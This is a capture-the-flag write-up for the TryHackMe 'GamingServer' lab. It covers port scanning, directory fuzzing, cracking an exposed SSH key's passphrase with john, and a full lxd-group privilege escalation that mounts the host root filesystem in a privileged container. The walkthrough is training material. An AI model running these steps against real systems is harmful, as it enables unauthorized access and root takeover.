# GamingServer
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* John
* SSH
* LXD

Tools used
--
* nmap
* ffuf
* ssh2john
* john
* ssh
* lxc

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.69.152
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.69.152 -p- -T5 -vvv

<SNIP>
Discovered open port 22/tcp on 10.10.69.152
Discovered open port 80/tcp on 10.10.69.152
<SNIP>
```
Let's fuzz the web service:
```
ffuf -u http://10.10.69.152/FFUF -H 'Host: 10.10.69.152' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w $SECLISTS/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 37ms]
secret                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 78ms]
```
Let's analyze also comments inside the HTML pages:
```
curl -s http://10.10.69.152/ | tidy -q -numeric -asxhtml --show-warnings no | xmlstarlet sel --html -t -m '//comment()' -v . -n

john, please add some actual content to the site! lorem ipsum is horrible to look at. 
```
So, one user is `john`.

## Phase 2: Foothold

Let's access to `secret` and let's retrieve the SSH key. Then, crack it:
```
python2 /usr/bin/ssh2john secretKey > id.hash

john id.hash --wordlist=$SECLISTS/Passwords/Leaked-Databases/rockyou.txt

<SNIP>
letmein          (secretKey)
<SNIP>
```
Let's access by SSH:
```
ssh 10.10.69.152 -l john -i secretKey 
Enter passphrase for key 'secretKey': letmein

cat user.txt
```
We got user flag.

## Phase 3: Privilege Escalation

By running `id`, we discover that `john` belongs to `lxd` group.

We can follow this exploit: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

So, on the attacker machine, run:
```
sudo pacman -Syy git go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```
Then, upload to the vulnerable server the files `lxd.tar.xz` and `rootfs.squashfs`:
```
scp -i ~/secretKey lxd.tar.xz rootfs.squashfs john@10.10.69.152:/home/john/
Enter passphrase: letmein

lxd.tar.xz
rootfs.squashfs
```
On the victim machine:
```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
Create a container and add root path:
```
lxc init alpine privesc -c security.privileged=true --alias=alpine
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Note: If you find this error Error: No storage pool found. Please create a new storage pool. Run `lxd init` and repeat the previous chunk of commands.

Execute the container:
```
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
Now run `cat root/root.txt` (note that it is equivalent to `cat /mnt/root/root/root.txt`).